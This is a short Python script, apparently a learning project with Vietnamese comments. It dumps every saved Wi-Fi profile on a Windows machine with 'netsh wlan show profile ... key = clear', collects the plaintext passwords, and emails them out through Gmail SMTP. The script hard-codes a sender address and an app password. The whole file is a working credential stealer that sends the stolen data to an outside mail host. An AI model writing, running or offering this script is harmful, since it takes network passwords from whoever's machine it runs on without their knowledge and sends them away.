import smtplib  # lib to send email
import subprocess
import re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)  # create a smtp server ( gg server and it runs on port 587)
    server.starttls()  # Giao thức TLS (Transport Layer Security) là một giao thức bảo mật được sử dụng để bảo vệ
    # thông tin khi truyền qua mạng
    server.login(email, password)  # login email
    server.sendmail(email, email, message)
    # email(1) : from
    # email(2) : to
    # message : massage from email(1) to email(2)
    server.quit()  # close server


def get_name(string):
    temp = string.split()
    rs = []
    check = False
    name_temp = ""
    for i in range(1, len(temp)):
        if temp[i - 1] == ':':
            check = True
        elif temp[i] == 'All':
            check = False

        if check:
            name_temp = name_temp + temp[i] + " "
        elif name_temp != "" and check == False:
            rs.append(name_temp.rstrip())
            name_temp = ""
    if name_temp != "":
        rs.append(name_temp[:-1])
    return rs


command = "netsh wlan show profile"  # %SystemRoot%\Sysnative\msg.exe * ....
networks = str(subprocess.check_output(command, shell=True))  # Popen: pop up a windows show command
# check_output : return message when you run command
network_names = re.findall("All User Profile\s*:.*", networks)
array = get_name(network_names[0])
result = ""
for i in array:
    network_name = '"' + i.replace("\n", "").replace("\r", "").replace("'", "") + '"'
    command = "netsh wlan show profile " + network_name + " key = clear"
    current_rs = subprocess.check_output(command, shell=True)
    result = result + current_rs.decode()

send_mail("themadcat2012003@gmail.com", "ivergtlpqfmcudlg", result)
